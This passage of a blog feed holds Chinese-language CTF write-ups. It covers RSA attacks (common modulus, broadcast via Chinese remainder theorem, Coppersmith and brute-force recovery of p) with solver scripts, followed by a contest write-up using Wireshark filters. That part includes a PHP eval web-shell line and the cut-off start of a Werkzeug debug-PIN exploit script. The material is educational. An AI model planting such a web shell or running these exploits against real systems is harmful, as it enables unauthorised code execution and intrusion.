class="number">-1</span>)*(k2<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(pow(c1,d,n))</span><br></pre></td></tr></table></figure></p><h2 id="多等式之共模攻击"><a href="#多等式之共模攻击" class="headerlink" title="多等式之共模攻击"></a>多等式之共模攻击</h2><p>这个方法应该大家都耳熟能详了，原理大致如下：<br>我们有条件</p><script type="math/tex; mode=display">C_1 \equiv  M^{e_1}  \text{ } mod \text{ } n \\ C_2 \equiv  M^{e_2} \text{ } mod \text{ } n \\</script><p>即利用</p><script type="math/tex; mode=display">gcd(e_1,e_2)=1 \\s_1e_1+s_2e_2 = 1</script><p>我们可以将式子1，2写成如下形式</p><script type="math/tex; mode=display">C_1 = k_1n+M^{e_1} \\C_2 = k_2n+M^{e_2} \\</script><p>然后式子1两边同时进行s1次方，式子2进行s2次方，得到</p><script type="math/tex; mode=display">C_1^{s_1} = (k_1n+M^{e_1})^{s_1} \\C_2^{s_2} = (k_2n+M^{e_2})^{s_2} \\</script><p>右边的高次展开式中，除了最后一项</p><script type="math/tex; mode=display">M^{e_1s_1} \\M^{e_2s_2}</script><p>一定每一项都含有n，所以同时取余n的时候，只剩下最后一项</p><script type="math/tex; mode=display">C_1^{s_1} \equiv  M^{e_1s_1}  \text{ } mod \text{ } n \\ C_2^{s_2} \equiv  M^{e_2s_2} \text{ } mod \text{ } n \\</script><p>上下两式相乘，即可得到</p><script type="math/tex; mode=display">C_1^{s_1}C_2^{s_2} \equiv  M^{e_1s_1+e_2s_2} \text{ } mod \text{ } n \\</script><p>又因为</p><script type="math/tex; mode=display">s_1e_1+s_2e_2 = 1</script><p>所以可以得到</p><script type="math/tex; mode=display">C_1^{s_1}C_2^{s_2} \equiv  M \text{ } mod \text{ } n \\</script><p>那么就很容易写出相应的脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = ......</span><br><span class="line">c1 = ......</span><br><span class="line">c2 = ......</span><br><span class="line">e1 = <span class="number">13604999</span></span><br><span class="line">e2 = <span class="number">12165379</span></span><br><span class="line">s1,s2,tmp = libnum.xgcd(e1,e2)</span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = gmpy2.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = gmpy2.invert(c2, n)</span><br><span class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure></p><h2 id="多等式之低加密指数广播攻击"><a href="#多等式之低加密指数广播攻击" class="headerlink" title="多等式之低加密指数广播攻击"></a>多等式之低加密指数广播攻击</h2><p>这其实是前面公约数的变形，因为e是低指数，所以可以使用中国剩余定理，题目也很容易，即用相同的公钥加密相同的消息，但每一组的n不同，e是一个很小的数，例如3或者10<br>所以我们有条件:（这里以e=10为例）</p><script type="math/tex; mode=display">\begin{cases} C_1 \equiv m^{10} \text{ } mod \text{ } n_1\\C_2 \equiv m^{10} \text{ } mod \text{ } n_2 \\C_3 \equiv m^{10} \text{ } mod \text{ } n_3 \\C_4 \equiv m^{10} \text{ } mod \text{ } n_4 \\C_5 \equiv m^{10} \text{ } mod \text{ } n_5 \\....... \\C_{10} \equiv m^{10} \text{ } mod \text{ } n_{10}\end{cases}</script><p>那我们看一下什么是中国剩余定理：<br>用现代数学的语言来说明的话，中国剩余定理给出了下列式子的一元线性同余方程组有解的判定条件，并用构造法给出了在有解情况下解的具体形式： </p><script type="math/tex; mode=display">x \equiv a_1 \text{ } mod \text{ } m_1 \\ x \equiv a_2 \text{ } mod \text{ } m_2 \\ ..... \\x \equiv a_n \text{ } mod \text{ } m_n \\</script><p>即，利用上述关系，我们可以求出x<br>但是有条件，即需要</p><script type="math/tex; mode=display">(m_1,m_2,....m_n)互素</script><p>这里显然满足，因为这里如果不互素，我们显然可以利用gcd分解出p或q，即文章的第一种情况<br>根据中国剩余定理，可以有通解</p><script type="math/tex; mode=display">x=\sum_{i=1}^{n}a_it_iM_i \text{ } mod \text{ } M</script><p>其中</p><script type="math/tex; mode=display">M=m_1m_2m_3.....m_n \\M_i = M/m_i \\ M_it_i \equiv 1 \text{ } mod \text{ } m_i</script><p>所以根据这则定理，我们可以写出如下脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">question = [c1,c2,c3....n1,n2,n3...]</span><br><span class="line">N = <span class="number">1</span></span><br><span class="line">e=<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">    N*=question[i][<span class="string">'n'</span>]</span><br><span class="line">N_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">    N_list.append(N/question[i][<span class="string">'n'</span>])</span><br><span class="line">t_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">    t_list.append(int(gmpy2.invert(N_list[i],question[i][<span class="string">'n'</span>])))</span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(question)):</span><br><span class="line">    sum = (sum+question[i][<span class="string">'c'</span>]*t_list[i]*N_list[i])%N</span><br><span class="line">sum = gmpy.root(sum,e)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(sum)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;

&lt;figure class=&quot;highlight pla
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="rsa" scheme="http://skysec.top/tags/rsa/"/>
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>Pwnhub-Crypto-韩国欧巴</title>
    <link href="http://skysec.top/2018/09/10/Pwnhub-Crypto-%E9%9F%A9%E5%9B%BD%E6%AC%A7%E5%B7%B4/"/>
    <id>http://skysec.top/2018/09/10/Pwnhub-Crypto-韩国欧巴/</id>
    <published>2018-09-10T01:12:37.000Z</published>
    <updated>2018-10-06T03:28:33.869Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发在安全客 https://www.anquanke.com/post/id/158533</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近日有机会做了一次pwnhub的crypto，闲下来后做了一下记录</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目很简短，如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> x, y, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> gmpy.is_prime(y) ** <span class="number">2016</span> + gmpy.is_prime(x+<span class="number">1</span>) ** <span class="number">2017</span> + ((x**<span class="number">2</span> - <span class="number">1</span>)**<span class="number">2</span> % (<span class="number">2</span>*x*y - <span class="number">1</span>) + <span class="number">2</span>) ** <span class="number">2018</span> == <span class="number">30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146</span></span><br><span class="line"></span><br><span class="line">p = gmpy.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>)</span><br><span class="line">q = gmpy.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">enc = pow(bytes_to_long(flag), <span class="number">0x10001</span>, n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'n ='</span>, n</span><br><span class="line"><span class="keyword">print</span> <span class="string">'enc ='</span>, enc</span><br></pre></td></tr></table></figure></p><p>这里我们摆出已知的几个式子</p><script type="math/tex; mode=display">y^{2016}+(x+1)^{2017}+(((x^{2}-1)^{2} \text{ } mod \text{ } (2xy-1))+2)^{2018} \\p = x^{3}+y^{3}+a \\q = x^{2}y+xy^{2}+b \\</script><p>那么现在的想法很清楚：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.利用已知的等式求出p和q</span><br><span class="line">2.利用已知的等式进行代换，不需求出p和q，直接整体带入解密</span><br></pre></td></tr></table></figure></p><p>这里我们选择走一步看一步，因为这样比较复杂的公式，我也没办法直接看出正解，只能步步为营</p><h2 id="解题step1"><a href="#解题step1" class="headerlink" title="解题step1"></a>解题step1</h2><p>首先从题目给的等式入手，这里的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_prime(y)</span><br><span class="line">is_prime(x+1)</span><br></pre></td></tr></table></figure></p><p>均为bool值</p><script type="math/tex; mode=display">bool^{2016}+bool^{2017}+(((x^{2}-1)^{2} \text{ } mod \text{ } (2xy-1))+2)^{2018}</script><p>式子中带有取余肯定是我们不希望看到的，于是我们从</p><script type="math/tex; mode=display">(((x^{2}-1)^{2} \text{ } mod \text{ } (2xy-1))+2)^{2018}</script><p>我们可以发现这是式子中的最高次，那么我们能否利用2018方对其进行范围缩小？<br>尝试分析</p><script type="math/tex; mode=display">(((x^{2}-1)^{2} \text{ } mod \text{ } (2xy-1))+2) \in (s,t)</script><p>为了方便后续描述，我们将等式右边的大数命名为num<br>通过简单运算发现<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num&gt;pow(<span class="number">2</span>,<span class="number">2018</span>)</span><br><span class="line">num&lt;pow(<span class="number">3</span>,<span class="number">2018</span>)</span><br></pre></td></tr></table></figure></p><p>所以我们成功得到等式</p><script type="math/tex; mode=display">((x^{2}-1)^{2} \text{ } mod \text{ } (2xy-1)) \equiv 0</script><p>即</p><script type="math/tex; mode=display">(x^{2}-1)^{2} \text{ } = k(2xy-1)</script><p>我们进一步计算，得到</p><script type="math/tex; mode=display">bool^{2016}+bool^{2017}=2</script><p>所以可以确定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">y为素数</span><br><span class="line">x+1为素数</span><br><span class="line">k为整数</span><br></pre></td></tr></table></figure></p><p>那么这就成了整数的抽象代数问题即如何利用上述条件得到x和y的关系</p><script type="math/tex; mode=display">(x^{2}-1)^{2} \text{ } = t(2xy-1) \\y为素数 \\x+1为素数 \\t为整数 \\</script><p>首先由x+1为素数，我们一定可以得到x为偶数<br>原因很简单，数字一共分为2种：2k和2k+1<br>2k一定不可能为素数，所以x+1为2k+1，那么x就是2k<br>所以x一定为偶数<br>不妨设<code>x=2k</code><br>则得到</p><script type="math/tex; mode=display">(4k^2-1)^2 = t(4ky-1)</script><p>不难看出，显然有一个解为</p><script type="math/tex; mode=display">y=k  \\t=4k^2-1</script><p>所以一定有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=2y</span><br></pre></td></tr></table></figure></p><p>可以使条件成立<br>所以题目的已知公式可以推出p和q的关系为</p><script type="math/tex; mode=display">p = x^{3}+y^{3}+a \\q = x^{2}y+xy^{2}+b \\x = 2y</script><p>即</p><script type="math/tex; mode=display">p=9y^3+a \\q=6y^3+b</script><h2 id="解题step2"><a href="#解题step2" class="headerlink" title="解题step2"></a>解题step2</h2><p>然后我们已知n的值，所以可以利用p*q=n去求n<br>但是由于这是一个三元方程</p><script type="math/tex; mode=display">p=9y^3+a \\q=6y^3+b \\n = bignum</script><p>但是我们知道a和b应该是一个不大的数，所以我们可以暂时忽略，求一个y的近似值<br>于是乎，我们可以有</p><script type="math/tex; mode=display">p \approx 9y^3 \\q \approx 6y^3 \\54y^6 \approx bignum</script><p>则p的近似值为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">19758773482416975773513594727554854838261383456469757248975289414355380735280879485422339870304527397062948550174303008020919366147474933112054539960497455035338201515203147106735705140472387837291772737954077643308046956678940164319688649687874053450947563446714782140815873215100887989866701486767419287547227200825869331893787470348194603234016874968352188422840451629535806709831811012761153410419196032233502030396198424770210265894560281233572716876438572593</span><br></pre></td></tr></table></figure></p><p>我们知道我们求出的p肯定是近似值，但是由于</p><script type="math/tex; mode=display">p=9y^3+a</script><p>这里的a很小，所以它只能改变低位的值，所以我们的p只是低位不准确<br>所以这里可以使用Coppersmith定理攻击去恢复不准确的低位<br>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">0x2ccce7ec66eee19f17522ba3b0a001f2668c6ab8d092001f0cd942fa84c23ab0234b5757448969faddd136fb4b07c0d7e6ad8f1b0e20d266e097abdd543bcfde62c14716df6e526c30df6018ca3ace1c8fb91b21940670bfecea64b859c47ce5a7a469d714c50598ed202a9a76b4eb5b8a275408697d80f4da5ef7a1b61be288738af57656e0fba938b571f1c8a06c59f60f0babe1edd3095621bb9125d7c71ca20286443dbf9ab721e230a7492e9f8e10f1b028065c8f12aac83502569dce5946264c0d1f18893e8f8f7489d548ec4254ee02a62b9acf313f2e1c8e28b563f242ed6613dce1a3dfd7d206d7b16e017e2dedbc5f80fbac85b78768abd4432da6c6e93e3e87a228cf332f69c0fd0613ccb76ee08de10bac7a6a42093259ca732254bfd38bc897872fae8e8dfef6498c66178e5006f9c69516967b089572bcc85b0af77273e269b679bb9d23119ee01004f005a36f58d50f1257d9b6024b3a4d560392ed03be731046866fbd268c3715164a19b17d52e6f349a9fc7a6bf15c1f21fd</span></span><br><span class="line">p=<span class="number">0x83295d058b8d47fa5103ce9f7cb3b9e403d38a13a3443f1f62c371966bd0b325a96ec64d50e63aff662a6f3c4f06dd62f006eff0cbffff3733e9b0a0f1778f2bbe9dc9c2885bcb3c6846171b490c3e1b8bc04d94868d47c68618bd31976e8da90d29ca1b21ba1d29512bfc9b5c683d9b3d5bfaa16c3115a4879b12a4a1a218aaf50e0102473663282c2514814e3e67d255a7111ffd8ea4e60b10569183a5cbe39d1e25135ed004d6255e44daac0b7196efe58d1e1ea97b662582f56fe50a20e31</span></span><br><span class="line">flag = <span class="keyword">False</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1024</span>):</span><br><span class="line">p_fake = p + <span class="number">2</span>**i</span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">'NTL'</span>)</span><br><span class="line">f = x - p_fake</span><br><span class="line">res = f.small_roots(X=<span class="number">2</span>**i, beta=<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">if</span> res:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> res:</span><br><span class="line">p_true = p_fake-j</span><br><span class="line"><span class="keyword">if</span> n%p_true == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> p_true</span><br><span class="line">flag = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>即可得到p<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">19758773482416975773513594727554854838261383456469757248975289414355380735280879485422339870304527397062948550174303008020919366147474933112054539960497455035338201515203147106735705140472387837291772737954077643308046956678940164319688649687874053450947563446714782140815873215100887989866701486767419287547227200825869331893787470348194603234016874968352188422840451629535806709831811012761153410419196032233502030396198424770210265894560281233572716876438572799</span><br></pre></td></tr></table></figure></p><h2 id="解题step3"><a href="#解题step3" class="headerlink" title="解题step3"></a>解题step3</h2><p>对于p的近似值恢复，也可以使用爆破方法，毕竟爆破量不是很大<br>爆破脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">enc = <span class="number">73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br><span class="line">n = <span class="number">260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line">p = <span class="number">9</span>*(gmpy.root(n/<span class="number">54</span>,<span class="number">6</span>)[<span class="number">0</span>])**<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> n%(p+i) == <span class="number">0</span>:</span><br><span class="line">        p = p+i</span><br><span class="line">        q = n/p</span><br><span class="line">        phi = int((p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">        d = gmpy2.invert(e,phi)</span><br><span class="line">        <span class="keyword">print</span> libnum.n2s(pow(enc,d,n))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>也可以轻松得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e01c9eb8078ea9bbac035ea68021c070&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&gt;&lt;/script&gt;

&lt;figure class=&quot;highlight pla
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="rsa" scheme="http://skysec.top/tags/rsa/"/>
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2018安恒8月赛Writeup</title>
    <link href="http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>http://skysec.top/2018/08/25/2018安恒8月赛Writeup/</id>
    <published>2018-08-25T12:43:42.000Z</published>
    <updated>2018-10-06T03:35:10.146Z</updated>
    
    <content type="html"><![CDATA[<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>这次流量分析不算难，可以轻易做出来<br>这里的记录就不仔细分析了，我还是耍了一些小聪明的<br>想学习的可以看我之前的文章<br><img src="/images/2018-08-25-12-27-14.png" alt=""><br><img src="/images/2018-08-25-12-27-29.png" alt=""><br>我就不粘链接了，懒。。。。</p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p>由于做过至少4~5次铁三的真题，所以对一般套路算是熟悉<br><img src="/images/2018-08-25-11-33-05.png" alt=""><br>这种要扫描器的，99%是awvs，直接交就对了，不行还能试试sqlmap也常考</p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p><img src="/images/2018-08-25-11-33-42.png" alt=""><br>这也是相对容易的题<br>直接过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure></p><p>因为登录99%是post<br>然后即可<br><img src="/images/2018-08-25-11-35-27.png" alt=""></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p><img src="/images/2018-08-25-11-36-49.png" alt=""><br>还是同理，过滤就完事了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; and ip.src==192.168.94.59 and http contains &quot;rec=login&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-08-25-11-41-25.png" alt=""></p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p><img src="/images/2018-08-25-11-41-41.png" alt=""><br>这显然还是post，过滤就完事了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; and ip.src==192.168.94.59</span><br></pre></td></tr></table></figure></p><p>发现小马<br><img src="/images/2018-08-25-11-42-54.png" alt=""><br>看到密码是1234<br>为了追求速度，我直接尝试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="number">1234</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>编码一下交了，就过了<br>想找位置的可以自己再过滤一下，我为了抢一血XD</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p><img src="/images/2018-08-25-11-46-12.png" alt=""><br>这个就更简单了，过滤就完事了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &apos;robots.txt&apos;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-08-25-11-51-56.png" alt=""><br>点进去就是</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p><img src="/images/2018-08-25-11-52-13.png" alt=""><br>直接看和a.php指令交互的respones即可<br><img src="/images/2018-08-25-12-23-14.png" alt=""></p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p><img src="/images/2018-08-25-11-52-23.png" alt=""><br>直接过滤就完事了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql contains &apos;hash_code&apos;</span><br></pre></td></tr></table></figure></p><p>随便找一个Respones点进去拉到底下就是</p><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p><img src="/images/2018-08-25-11-56-45.png" alt=""><br>直接过滤就完事了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql contains &apos;ijnu&apos;</span><br></pre></td></tr></table></figure></p><p>随便找一个Respones点进去拉到底下就是md5<br>用cmd5要收费，用somd5解密即可</p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p><img src="/images/2018-08-25-11-58-26.png" alt=""><br>直接搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;eth0&quot;</span><br></pre></td></tr></table></figure></p><p>就完事了</p><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p><img src="/images/2018-08-25-11-57-28.png" alt=""><br>这题我以为是重复题，交了level-3的答案，直接就过了，不过分析原理应该一致</p><h3 id="level-11-level-12"><a href="#level-11-level-12" class="headerlink" title="level-11/level-12"></a>level-11/level-12</h3><p>这题彩蛋，两个一样的题<br>过滤了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-08-25-11-59-38.png" alt=""><br>发现全是这俩ip<br>反正没有铁三那种次数限制，我就分别交了下<br>发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.3.4.3</span><br></pre></td></tr></table></figure></p><p>成功</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="粗心的程序员呀"><a href="#粗心的程序员呀" class="headerlink" title="粗心的程序员呀"></a>粗心的程序员呀</h3><p>发现只有debug信息和文件读取<br>那么只有一个可能了，pin码执行命令<br>参照这篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2553</span><br></pre></td></tr></table></figure></p><p>即可秒掉<br>这里说几个坑<br>1.machine-id为空<br>2.<img src="/images/2018-08-25-12-07-29.png" alt=""><br>先知用的是py，这里要用pyc<br>3.username，这里读/etc/passwd可以发现ctf用户，就是它了<br>最后payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'ctf'</span>,<span class="comment"># 